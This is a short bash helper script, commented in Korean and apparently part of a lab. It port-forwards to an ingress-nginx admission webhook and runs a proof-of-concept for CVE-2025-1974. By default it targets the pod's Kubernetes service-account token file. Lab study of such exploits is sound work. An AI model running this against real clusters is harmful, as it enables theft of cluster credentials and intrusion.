#!/usr/bin/env bash
# stage3_run.sh — CVE-2025-1974 PoC 실행 헬퍼
# port-forward를 백그라운드로 열고 PoC를 실행한 뒤 정리한다.
set -euo pipefail

export PATH="$HOME/.local/bin:$PATH"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_ROOT="$(dirname "$SCRIPT_DIR")"
POC_SCRIPT="$LAB_ROOT/poc/cve_2025_1974_poc.py"
PF_PID_FILE="/tmp/poc_portforward.pid"
WEBHOOK_PORT=8443
STEP="${1:-all}"        # 인자: 1 | 2 | 3 | all
TARGET_FILE="${2:-/var/run/secrets/kubernetes.io/serviceaccount/token}"

_info() { echo "[INFO]  $*"; }
_ok()   { echo "[OK]    $*"; }
_die()  { echo "[ERROR] $*" >&2; exit 1; }

cleanup() {
    if [[ -f "$PF_PID_FILE" ]]; then
        kill "$(cat "$PF_PID_FILE")" 2>/dev/null || true
        rm -f "$PF_PID_FILE"
        _info "port-forward 종료"
    fi
}
trap cleanup EXIT

# ── 사전 확인 ─────────────────────────────────────────────────────────────────
command -v kubectl >/dev/null || _die "kubectl 없음. PATH 확인: export PATH=\$HOME/.local/bin:\$PATH"
command -v python3 >/dev/null || _die "python3 없음"

_info "클러스터 상태 확인..."
kubectl get pods -n ingress-nginx -l app.kubernetes.io/component=controller \
    --field-selector=status.phase=Running -o name | grep -q pod \
    || _die "ingress-nginx controller Pod가 Running 상태가 아님. 'make cluster-up' 실행 필요"

# ── port-forward 시작 ─────────────────────────────────────────────────────────
_info "port-forward 시작: localhost:${WEBHOOK_PORT} → webhook:443"
kubectl port-forward svc/ingress-nginx-controller-admission \
    "${WEBHOOK_PORT}:443" -n ingress-nginx \
    >/tmp/poc_portforward.log 2>&1 &
echo $! > "$PF_PID_FILE"

# 준비될 때까지 대기
for i in $(seq 1 10); do
    sleep 1
    if ss -tlnp 2>/dev/null | grep -q ":${WEBHOOK_PORT}"; then
        _ok "port-forward 준비됨 (port ${WEBHOOK_PORT})"
        break
    fi
    if [[ $i -eq 10 ]]; then
        _die "port-forward 실패. 로그: $(cat /tmp/poc_portforward.log)"
    fi
done

# ── PoC 실행 ─────────────────────────────────────────────────────────────────
_info "PoC 실행 (step=${STEP}, file=${TARGET_FILE})"
python3 "$POC_SCRIPT" \
    --target "https://127.0.0.1:${WEBHOOK_PORT}" \
    --step "$STEP" \
    --file "$TARGET_FILE"
